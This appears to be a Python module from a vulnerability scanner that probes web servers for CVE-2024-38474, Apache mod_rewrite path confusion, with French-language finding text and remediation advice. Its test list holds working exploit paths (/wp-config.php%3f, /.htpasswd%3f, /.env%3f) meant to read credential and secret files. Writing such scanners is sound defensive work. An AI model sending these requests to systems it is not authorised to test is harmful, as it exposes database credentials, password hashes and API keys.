"""CVE-2024-38474 — Apache mod_rewrite path confusion via encoded question mark."""

from __future__ import annotations

from typing import TYPE_CHECKING

from core.models import Compliance, Evidence, Finding, Severity, Confidence, FindingType
from modules.base import BazookaModule, ModuleResult

if TYPE_CHECKING:
    from core.engine import ScanContext
    from core.session import BazookaSession

# Paths to test with %3f (encoded '?') suffix.
# If the server processes the path before the rewrite, the encoded '?' is decoded
# and the remainder is treated as a query string, bypassing access controls.
_TEST_PATHS: list[dict[str, str]] = [
    {
        "path": "/wp-config.php%3f",
        "label": "wp-config.php",
        "sensitive": "DB_NAME",
    },
    {
        "path": "/.htpasswd%3f",
        "label": ".htpasswd",
        "sensitive": ":",
    },
    {
        "path": "/.env%3f",
        "label": ".env",
        "sensitive": "=",
    },
]


class ModRewriteCVEModule(BazookaModule):
    name = "vuln.mod_rewrite_cve"
    phase = "vuln"
    description = "CVE-2024-38474 mod_rewrite path confusion"
    profiles = ["standard", "aggressive"]
    intrusive = False

    async def run(self, ctx: ScanContext, session: BazookaSession) -> ModuleResult:
        result = ModuleResult()
        base = ctx.target.url
        cve_confirmed = False

        for entry in _TEST_PATHS:
            test_url = f"{base}{entry['path']}"
            label = entry["label"]

            try:
                # IMPORTANT: disable follow_redirects to detect 302 behaviour
                resp = await session.get(
                    test_url,
                    use_cache=False,
                    follow_redirects=False,
                )
            except Exception:
                continue

            vulnerable = False
            evidence_excerpt = ""

            # Detection 1: 302 redirect = server processed the path and redirected
            # (WordPress often redirects wp-config.php requests when path confusion works)
            if resp.status_code in (301, 302, 307):
                location = resp.headers.get("location", "")
                # Only flag if Location actually contains the target filename;
                # generic redirects (e.g. trailing-slash, HTTPS upgrade) are NOT
                # path confusion. The previous `or location` made this finding
                # fire on every 30x — a major false positive source.
                target_token = label.replace(".", "").lower()
                if target_token and target_token in location.replace(".", "").lower():
                    vulnerable = True
                    evidence_excerpt = f"Redirect {resp.status_code} -> {location}"

            # Detection 2: 200 with sensitive content leaked
            if resp.status_code == 200:
                body = resp.text[:5000]
                if entry["sensitive"] in body:
                    vulnerable = True
                    evidence_excerpt = body[:300]

            if vulnerable:
                cve_confirmed = True
                result.add_finding(Finding(
                    id=f"VULN-CVE-2024-38474-{label.replace('.', '_')}",
                    title=f"CVE-2024-38474: path confusion sur {label}",
                    severity=Severity.CRITICAL,
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    confidence=Confidence.CONFIRMED,
                    finding_type=FindingType.CVE,
                    description=(
                        f"CVE-2024-38474: Apache mod_rewrite decodage premature du %3f dans l'URL. "
                        f"La requete vers {entry['path']} a provoque une reponse {resp.status_code} "
                        f"au lieu d'un 403/404, confirmant que le serveur traite le chemin avant "
                        f"l'application des regles d'acces."
                    ),
                    evidence=Evidence(
                        request=f"GET {test_url}",
                        response_status=resp.status_code,
                        response_headers=dict(resp.headers),
                        response_body_excerpt=evidence_excerpt[:500],
                    ),
                    impact=(
                        f"Acces non autorise au fichier {label}. "
                        "wp-config.php contient les credentials de base de donnees. "
                        ".htpasswd contient des hashes de mots de passe. "
                        ".env peut contenir des cles API et des secrets."
                    ),
                    remediation=(
                        "Mettre a jour Apache HTTP Server vers la version 2.4.60 ou superieure. "
                        "Verifier les regles mod_rewrite pour s'assurer qu'elles gerernt correctement "
                        "les caracteres encodes."
                    ),
                    compliance=Compliance(
                        owasp_2021="A01:2021 - Broken Access Control",
                        cwe="CWE-706",
                        mitre_attack="T1083 - File and Directory Discovery",
                    ),
                    references=[
                        "https://nvd.nist.gov/vuln/detail/CVE-2024-38474",
                        "https://httpd.apache.org/security/vulnerabilities_24.html",
                        "https://blog.orange.tw/2024/08/confusion-attacks-en.html",
                    ],
                    phase="vuln",
                    module=self.name,
                    tags=["cve", "apache", "mod_rewrite", "path-confusion"],
                ))

        if not cve_confirmed:
            result.add_finding(Finding(
                id="VULN-CVE-2024-38474-SAFE",
                title="CVE-2024-38474: pas de path confusion detectee",
                severity=Severity.INFO,
                cvss_score=0.0,
                confidence=Confidence.CONFIRMED,
                finding_type=FindingType.CVE,
                description=(
                    "Les tests avec %3f sur wp-config.php, .htpasswd et .env n'ont pas "
                    "revele de comportement de path confusion (mod_rewrite). "
                    "Le serveur retourne correctement 403/404."
                ),
                phase="vuln",
                module=self.name,
                tags=["cve", "apache", "mod_rewrite"],
            ))

        return result
